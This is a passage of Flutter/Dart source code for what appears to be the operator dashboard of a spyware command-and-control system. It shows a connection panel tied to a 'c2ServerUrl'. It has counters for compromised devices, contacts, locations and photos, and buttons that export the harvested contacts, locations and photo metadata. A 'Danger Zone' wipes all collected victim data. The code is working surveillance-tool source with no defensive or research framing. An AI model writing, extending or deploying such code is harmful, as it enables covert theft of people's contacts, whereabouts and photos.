                        onPressed: () => Navigator.pop(context),
                      ),
                    ),
                    Positioned(
                      bottom: 20, left: 20, right: 20,
                      child: Container(
                        padding: const EdgeInsets.all(12),
                        decoration: BoxDecoration(color: Colors.black54, borderRadius: BorderRadius.circular(8)),
                        child: Text(photo['device_name'] ?? 'Unknown', style: const TextStyle(color: Colors.white), textAlign: TextAlign.center),
                      ),
                    ),
                  ],
                ),
              ),
            );
          },
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: primaryRed.withOpacity(0.3)),
              image: DecorationImage(image: MemoryImage(base64Decode(photo['image'])), fit: BoxFit.cover),
            ),
            child: Align(
              alignment: Alignment.bottomCenter,
              child: Container(
                padding: const EdgeInsets.all(4),
                decoration: BoxDecoration(color: Colors.black.withOpacity(0.7), borderRadius: const BorderRadius.vertical(bottom: Radius.circular(12))),
                width: double.infinity,
                child: Text(_formatTime(photo['timestamp']), style: const TextStyle(color: Colors.white, fontSize: 10), textAlign: TextAlign.center),
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildSettingsTab() {
    return ListView(
      padding: const EdgeInsets.all(16),
      children: [
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: primaryRed.withOpacity(0.2)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [Icon(Icons.wifi, color: primaryRed, size: 20), const SizedBox(width: 8), Text('CONNECTION', style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold, fontSize: 14))]),
              const SizedBox(height: 16),
              ListTile(
                leading: Container(width: 10, height: 10, decoration: BoxDecoration(color: _isConnected ? primaryRed : accentRed, shape: BoxShape.circle, boxShadow: [BoxShadow(color: _isConnected ? primaryRed : accentRed, blurRadius: 4)])),
                title: Text(_connectionStatus, style: const TextStyle(color: Colors.white)),
                subtitle: Text(c2ServerUrl, style: const TextStyle(color: Colors.white54, fontSize: 12)),
                trailing: IconButton(icon: Icon(Icons.refresh, color: primaryRed), onPressed: _connectToC2Server),
              ),
            ],
          ),
        ),
        
        const SizedBox(height: 16),
        
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: primaryRed.withOpacity(0.2)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [Icon(Icons.storage, color: primaryRed, size: 20), const SizedBox(width: 8), Text('STATISTICS', style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold, fontSize: 14))]),
              const SizedBox(height: 16),
              _buildStatRow('Total Devices', _devices.length.toString()),
              _buildStatRow('Total Contacts', _contacts.length.toString()),
              _buildStatRow('Total Locations', _locations.length.toString()),
              _buildStatRow('Total Photos', _photos.length.toString()),
            ],
          ),
        ),
        
        const SizedBox(height: 16),
        
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: primaryRed.withOpacity(0.2)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [Icon(Icons.download, color: primaryRed, size: 20), const SizedBox(width: 8), Text('EXPORT DATA', style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold, fontSize: 14))]),
              const SizedBox(height: 16),
              ListTile(
                leading: const Icon(Icons.contacts, color: primaryRed),
                title: const Text('Export Contacts', style: TextStyle(color: Colors.white)),
                trailing: const Icon(Icons.download, color: primaryRed),
                onTap: () {
                  final jsonStr = jsonEncode(_contacts);
                  Clipboard.setData(ClipboardData(text: jsonStr));
                  _showSnackBar('Contacts copied to clipboard');
                },
              ),
              ListTile(
                leading: const Icon(Icons.location_on, color: primaryRed),
                title: const Text('Export Locations', style: TextStyle(color: Colors.white)),
                trailing: const Icon(Icons.download, color: primaryRed),
                onTap: () {
                  final jsonStr = jsonEncode(_locations);
                  Clipboard.setData(ClipboardData(text: jsonStr));
                  _showSnackBar('Locations copied to clipboard');
                },
              ),
              ListTile(
                leading: const Icon(Icons.photo, color: primaryRed),
                title: const Text('Export Photos', style: TextStyle(color: Colors.white)),
                trailing: const Icon(Icons.download, color: primaryRed),
                onTap: () {
                  final jsonStr = jsonEncode(_photos.map((p) {
                    return {'device': p['device_name'], 'time': p['timestamp'].toIso8601String(), 'image_base64': p['image'].substring(0, 50) + '...'};
                  }).toList());
                  Clipboard.setData(ClipboardData(text: jsonStr));
                  _showSnackBar('Photo metadata copied to clipboard');
                },
              ),
            ],
          ),
        ),
        
        const SizedBox(height: 16),
        
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: accentRed.withOpacity(0.5)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(children: [Icon(Icons.warning, color: accentRed, size: 20), const SizedBox(width: 8), Text('DANGER ZONE', style: TextStyle(color: accentRed, fontWeight: FontWeight.bold, fontSize: 14))]),
              const SizedBox(height: 16),
              ListTile(
                leading: const Icon(Icons.delete_forever, color: accentRed),
                title: const Text('Clear All Data', style: TextStyle(color: accentRed)),
                onTap: () {
                  showDialog(
                    context: context,
                    builder: (context) => AlertDialog(
                      backgroundColor: cardBg,
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: accentRed.withOpacity(0.3))),
                      title: const Text('Clear All Data?', style: TextStyle(color: Colors.white)),
                      content: const Text('This will delete all collected contacts, locations, and photos permanently.', style: TextStyle(color: Colors.white70)),
                      actions: [
                        TextButton(onPressed: () => Navigator.pop(context), child: const Text('CANCEL', style: TextStyle(color: Colors.white70))),
                        ElevatedButton(
                          onPressed: () {
                            setState(() { _contacts.clear(); _locations.clear(); _photos.clear(); });
                            Navigator.pop(context);
                            _showSnackBar('All data cleared');
                          },
                          style: ElevatedButton.styleFrom(backgroundColor: accentRed, foregroundColor: Colors.white),
                          child: const Text('CLEAR'),
                        ),
                      ],
                    ),
                  );
                },
              ),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildStatRow(String label, String value) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
        Text(label, style: const TextStyle(color: Colors.white70)),
        Text(value, style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold)),
      ]),
    );
  }

  @override
  void dispose() {
    _tabController.dispose();
    _channel?.sink.close();
    _refreshTimer?.cancel();
    super.dispose();
  }
}